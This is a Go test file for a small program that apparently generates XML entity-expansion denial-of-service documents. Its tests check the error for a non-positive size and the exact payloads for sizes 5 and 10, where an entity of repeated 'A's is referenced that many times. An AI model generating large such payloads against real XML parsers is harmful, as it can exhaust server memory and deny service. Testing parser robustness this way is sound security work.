package main

import (
	"bytes"
	"testing"
)

func TestRunWithNonPositiveN(t *testing.T) {
	var stdout bytes.Buffer
	args := []string{"program", "-n", "-42"}
	if err := run(&stdout, args); err != ErrNonPositiveN {
		t.Errorf("want: %v; got: %v", ErrNonPositiveN, err)
	}
}

func TestRunWith5(t *testing.T) {
	const want = `<?xml version="1.0"?>
<!DOCTYPE DoS [
  <!ENTITY x "AAAAA">
]>
<DoS>&x;&x;&x;&x;&x;</DoS>
`
	var stdout bytes.Buffer
	args := []string{"program", "-n", "5"}
	if err := run(&stdout, args); err != nil {
		t.Errorf("unexpected error: %v", err)
	}
	if got := stdout.String(); got != want {
		t.Errorf("want %v; got %v", want, got)
	}
}

func TestRunWith10(t *testing.T) {
	const want = `<?xml version="1.0"?>
<!DOCTYPE DoS [
  <!ENTITY x "AAAAAAAAAA">
]>
<DoS>&x;&x;&x;&x;&x;&x;&x;&x;&x;&x;</DoS>
`
	var stdout bytes.Buffer
	args := []string{"program", "-n", "10"}
	if err := run(&stdout, args); err != nil {
		t.Errorf("unexpected error: %v", err)
	}
	if got := stdout.String(); got != want {
		t.Errorf("want %v; got %v", want, got)
	}
}
